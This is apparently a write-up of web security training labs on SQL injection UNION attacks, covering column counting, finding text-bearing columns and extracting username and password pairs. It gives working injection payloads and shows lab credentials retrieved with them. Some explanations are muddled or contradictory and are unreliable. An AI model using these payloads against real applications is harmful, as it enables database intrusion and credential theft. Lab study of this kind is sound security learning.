---
title: SQL UNION Attack
date: 2026-03-20
readTime: 8 min
category: writeup
description: Exploiting SQL UNION operator to retrieve data from other database tables.
icon: 💉
coverImage: ""
---

# SQL UNION Attack

## Retrieving data from other database tables

```sql
SELECT id, name FROM employees
UNION
SELECT id, name FROM managers;
```

The **UNION** operator combines result sets from multiple SELECT statements.

## SQL injection **UNION** attack

Before proceeding to the main SQL injection lab:

[https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

After going to the **Labs** category, the lab already says there is a vulnerability.

The goal is to determine the number of columns by testing a row containing `NULL` values.

For example, let's take a random table with columns:

In the first row, we can see `id`, `name`, and `age`. On the server, this random table might have a query like:

`SELECT id, name, age FROM users WHERE name = 'Alice';`

This table name is `users`.

**Now, in our case:**

We don’t know the rows or the columns in the lab, but we know our query is similar to the example above.

As we already know, UNION helps to combine result lists.

Logically, we will use `UNION` with `SELECT`.

I chose the **Gifts category** as the target.

Now we need to find the number of columns by testing `NULL` values.

# **Lab: SQL injection UNION attack**

**Initial SQL injection**:

- The attacker closes the current string with `'`.
- The query becomes:

```sql
SELECT id, name, price FROM products WHERE category = 'Gifts;
# from
SELECT id, name, price FROM products WHERE category = 'Gifts';
```

- **UNION**: The **`UNION`** operator is used to combine the result sets of two **`SELECT`** statements into a single result set.
- **Second SELECT**: The second **`SELECT`** in the **`UNION`** clause provides additional rows. It does not change the values returned by the first **`SELECT`**.

In your example:

```sql
SELECT id, name, price FROM products
WHERE category = 'Gifts'
UNION SELECT NULL, NULL, NULL --;
```

- The first **`SELECT`** retrieves **`id`**, **`name`**, and **`price`** from the **`products`** table where the category is **`'Gifts'`**.
- The second **`SELECT`** (**`SELECT NULL, NULL, NULL`**) creates a result set with a single row of **`NULL`** values for each of the three columns.
- **Purpose**: The purpose of the second **`SELECT`** is to add a row of `NULL` values to the combined result set. It does **not** change the rows returned by the first `SELECT`. It simply appends an extra row.
- **Note**: `NULL` means “no value”. It is not a string, integer, or variable.

```
SELECT NULL, NULL, NULL, NULL--
```

This will give an error. If you see an error with 4 `NULL` values, it means the query does not return 4 columns. In other words, the number of columns is less than 4.

### **Corrected understanding**

- **UNION** combines two result sets.
- The second **`SELECT`** provides additional rows.

So the correct query is:

filter?category=Gifts’UNION+SELECT+NULL,NULL,NULL—

If you want to change the order of the list, you can do:

[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 1--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%201--)

Because `ORDER BY 1` might refer to a column that is not visible in the list, you may not see a change, but the injection is working.



[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 2--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%201--)

`ORDER BY 2` is in **alphabetical order**.



[https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts' ORDER BY 3--](https://0a7f002d04c8b91880577be0000600d8.web-security-academy.net/filter?category=Gifts%27%20ORDER%20BY%201--)

It is in ascending order of the price.



## **Database-specific syntax**

In an Oracle database, every SELECT query must use the FROM keyword and specify a **valid table**.

- Note: If you are confused about what an Oracle database is: it is an RDBMS (Relational Database Management System). If you are wondering whether Oracle is the only RDBMS: the answer is no. Some examples are listed below.
    - **Oracle Database**: A robust and feature-rich RDBMS produced by Oracle Corporation.
    - **MySQL**: An open-source RDBMS widely used in web applications.
    - **PostgreSQL**: An open-source RDBMS known for its advanced features and compliance with SQL standards.
    - **Microsoft SQL Server**: An RDBMS developed by Microsoft, commonly used in enterprise environments.
    - **IBM Db2**: An RDBMS from IBM, known for high performance and scalability.

`' UNION SELECT NULL FROM DUAL--`

Let’s break down this query:

- UNION is used to combine two or more `SELECT` statements.
- Each `SELECT` statement in a `UNION` must have the same number of columns.
- `SELECT NULL FROM DUAL`: This selects a `NULL` value from the `DUAL` table. Since `DUAL` contains exactly one row, this returns a single row with a single `NULL` value.

## Lab 2: Finding a column containing text

`category=Lifestyle'+UNION+SELECT+NULL,'0xToAs',NULL—`

So, the executable string data type in the column was the 2nd column.

If you don’t understand how, here’s an example layout:

```sql
| Column1 | Column2 | Column3 |
|---------|---------|---------|
| NULL    | 0xToAs  | NULL    |
| NULL    |         | NULL    |
| NULL    |         | NULL    |
```

By looking at this table, we can say the database results might look like this. The string `'0xToAs'` was only executable in `Column2`.

# **If you did not understand this yet, here is a summary of #Lab 1 and #Lab 2**

- By solving the second lab, we learned that a string data type can only be executed in the second column. #Lab 1 and #Lab 2 are connected. Summary below.
    
    The query for the first lab was `‘UNION+SELECT+NULL+NULL+NULL’`, and it executed successfully. We learned that there are actually 3 columns. After using this query, the results look like:
    
    ```jsx
    | Column1 | Column2 | Column3 |
    |---------|---------|---------|
    | NULL    | 0xToAs  | NULL    |
    | NULL    | NULL    | NULL    |
    ```
    
    These red-highlighted NULL values are executed by the #Lab 1 query, which is only used to determine the number of columns.
    
    Using the combination below (replacing `NULL` each time) helps you find which column accepts string data:
    
    - `category=Lifestyle'+UNION+SELECT+'0xToAs',NULL,NULL—` #internal error
    - `category=Lifestyle'+UNION+SELECT+NULL,'0xToAs',NULL—` #successful
    - `category=Lifestyle'+UNION+SELECT+NULL,NULL,'0xToAs'—` #internal error
    

# **Using a SQL injection UNION attack to retrieve interesting data**

In this `UNION` attack, we will use the experience and skills we learned before to access the administrator portal.

## **Lab:** [**SQL injection UNION**](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving data from other tables

Using: `‘UNION SELECT username,password FROM users—`



[**Examining the database in** [**SQL injection**](https://portswigger.net/web-security/sql-injection) **attacks**](Union%20ATTACKS%20SQL/Examining%20the%20database%20in%20SQL%20injection%20attacks%20ff5eb12126ff4688a7fc416ed2baaf5e.md)

# **Retrieving multiple values within a single column**

Unlike the previous query, which was used to retrieve a single value, we will now use a query that retrieves multiple values within a single column.

## **Lab:** [**SQL injection UNION**](https://portswigger.net/web-security/sql-injection/union-attacks) attack, retrieving multiple values in a single column



After using this query, we successfully retrieved many values in a single column:

**`Pets' UNION SELECT NULL,username ||'~'|| password  FROM users--`**

Breakdown:

| Column1 | Column2 |
| --- | --- |
| 1 | administrator~i18q3v7h0ybmvfaplx9o |
| 2 | Giant Grasshopper |
| NULL | carlos~pc5cv35gswgctmbvjif7 |
|  |  |

The table above shows what the results might look like.

The administrator and password are in the same column, separated by ~.

NULL is a placeholder for Column1.

`username` and `password` are just variables. Everything should be clear now.